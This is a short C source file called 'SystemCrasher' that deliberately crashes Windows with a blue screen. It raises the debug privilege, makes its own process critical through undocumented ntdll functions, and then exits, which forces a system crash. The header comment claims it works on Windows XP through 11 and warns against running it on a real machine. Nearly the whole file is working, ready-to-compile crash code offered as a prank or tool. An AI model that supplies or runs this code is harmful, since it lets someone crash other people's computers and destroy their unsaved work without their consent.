/* SystemCrasher works from Windows XP to Windows 11, all versions, either 32-bit or 64-bit. For some reason, it does not work on Windows XP 64-bit.
 This does not harm your files or system files, but it can affect the system if you run this for a lot of times, maybe. Do not run it on your real machine if you do not want to cause any damage.
 
<By Ali Diaa>*/

#include <Windows.h>

int set_critical() {
	NTSTATUS(NTAPI * RtlAdjustPrivilege)(ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled);
	NTSTATUS(NTAPI * RtlSetProcessIsCritical)(BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedScb);
	NTSTATUS ntReturnValue;
	ULONG ulBreakOnTermination;
	BOOLEAN bUnused;
	HMODULE hNtDll = LoadLibraryW(L"ntdll.dll");
	RtlAdjustPrivilege = (PVOID)GetProcAddress(hNtDll, "RtlAdjustPrivilege");
	RtlSetProcessIsCritical = (PVOID)GetProcAddress(hNtDll, "RtlSetProcessIsCritical");

	if (RtlAdjustPrivilege)
	{
		ntReturnValue = RtlAdjustPrivilege(20, TRUE, FALSE, &bUnused);

		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"I cannot adjust my debug privileges...", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

			return FALSE;
		}
	}
	else
	{
		MessageBoxW(NULL, L"I cannot find RtlAdjustPrivilege.\nWTF is this?", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

		return FALSE;
	}

	if (RtlSetProcessIsCritical)
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical(TRUE, NULL, FALSE);

		if (ntReturnValue)
		{
			MessageBoxW(NULL, L"It is not letting me become a critical process.\nThis is not fair!", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

			return FALSE;
		}
	}
	else
	{
		MessageBoxW(NULL, L"I cannot find RtlSetProcessIsCritical.\nDo you know where it is?", L"Kernel32", MB_OK | MB_ICONERROR | MB_SYSTEMMODAL);

		return FALSE;
	}
	return 0;
}

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ PWSTR szCmdLine, _In_ int nShowCmd) {

	// Setting the program as a critical system process!
	set_critical();

	// Crashing the system / Calling the BSOD!
	ExitProcess(0);
	return 0;

}
